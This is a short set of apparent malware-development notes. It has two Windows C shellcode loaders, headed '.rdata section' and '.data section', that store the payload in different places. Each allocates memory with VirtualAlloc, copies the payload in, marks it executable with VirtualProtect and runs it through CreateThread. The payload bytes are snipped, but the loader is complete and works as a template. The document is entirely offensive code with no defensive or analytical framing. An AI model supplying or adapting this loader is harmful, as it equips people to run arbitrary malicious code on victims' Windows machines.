# .rdata section
```c
#include <windows.h>

void main() {

	unsigned char payload[] = ....SNIP....
	unsigned int payloadSize = sizeof(payload);

	void *allocatedMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	if (allocatedMemory != 0) {
	
		RtlMoveMemory(allocatedMemory, payload, payloadSize);

		DWORD oldProtect = 0;
		VirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

		HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
		
		if (thread != 0) {
			WaitForSingleObject(thread, -1);
		}
	}
}
```

# .data section
```c
#include <windows.h>

unsigned char payload[] = ....SNIP....
unsigned int payloadSize = sizeof(payload);

void main() {

	void *allocatedMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	if (allocatedMemory != 0) {
	
		RtlMoveMemory(allocatedMemory, payload, payloadSize);

		DWORD oldProtect = 0;
		VirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

		HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
		
		if (thread != 0) {
			WaitForSingleObject(thread, -1);
		}
	}
}
```
